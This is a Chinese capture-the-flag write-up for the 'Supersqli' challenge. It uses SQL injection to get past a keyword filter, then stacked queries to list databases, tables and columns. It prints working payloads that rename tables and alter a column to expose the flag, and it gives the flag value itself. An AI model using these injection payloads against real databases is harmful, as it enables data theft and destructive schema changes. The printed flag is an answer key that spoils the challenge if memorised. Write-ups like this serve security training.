# Supersqli

> sql注入,用sqlmap一把梭能探测到存在sql注入,但是获取不了所有数据

## 思路分析

> sql注入,用sqlmap一把梭能探测到存在sql注入,但是获取不了所有数据.手攻来注入,直接加单引号,报错,发现用#可注释掉.先用order by判断字段数量

> 1' order by 1 # 
> 1' order by 3 # 这时报错,说明字段数量有2个
> 这时后加union select发现报错,有过滤条件,
> return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
> 常见的字符串已经过滤掉了,此时尝试堆叠注入,发现能用

> 1';show databases;# 查看所有数据库
> 1';show tables;#    查看所有表格
> 1';show columns from words;#    查看words表格下面的列
> 1';show columns from \`1919810931114514\`;#  (数字1开头时要加反引号,mysql规定,为了不和保留字符相冲突)

> 前面查看words表时发现了2个表格,所以判断出默认查询的表是words表,又发现flag存在1919810931114514b表中,没有过滤rename和alert,所以可以采用修改表结构的方法来得到flag,将words表名改为words1,再将数字名表改为words,这样数字名表就是默认查询的表了,但是它少了一个id列,可以将flag字段改为id,或者添加id字段
> 1';rename tables \`words\` to \`words1\`;rename tables \`1919810931114514\` to \`words\`; alter table \`words\` change \`flag\` \`id\` varchar(100);#

> 最后1' or 1=1 # 获取flag

## payload

> 1';rename tables \`words\` to \`words1\`;rename tables \`1919810931114514\` to \`words\`; alter table \`words\` change \`flag\` \`id\` varchar(100);#

> 1' or 1=1 #

## flag

> flag{c168d583ed0d4d7196967b28cbd0b5e9}